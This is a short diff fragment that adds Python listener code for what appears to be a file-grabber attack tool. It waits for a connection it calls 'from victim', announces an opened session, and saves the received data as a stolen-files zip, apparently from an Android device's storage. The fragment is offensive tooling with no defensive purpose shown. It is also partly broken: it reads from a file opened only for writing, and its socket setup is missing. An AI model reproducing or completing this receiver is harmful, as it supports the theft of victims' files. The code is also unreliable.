@@ -1,0 +1,16 @@
+s.listen(10)
+print(y+'[-]'+w+' Server is running ...')
+print(y+'[-]'+w+' waiting interraction from victim')
+sc, address = s.accept()
+print(b+'[+]'+w+' session opened from =>',address)
+os.system('cd /sdcard')
+f = open("filegrabber-result.zip","wb")
+data = f.read()
+while data != bytes(''.encode()):
+    data = sc.recv(1024)
+    while (data):
+        f.write(data)
+        data = sc.recv(1024)
+f.close()
+sc.close()
+s.close()
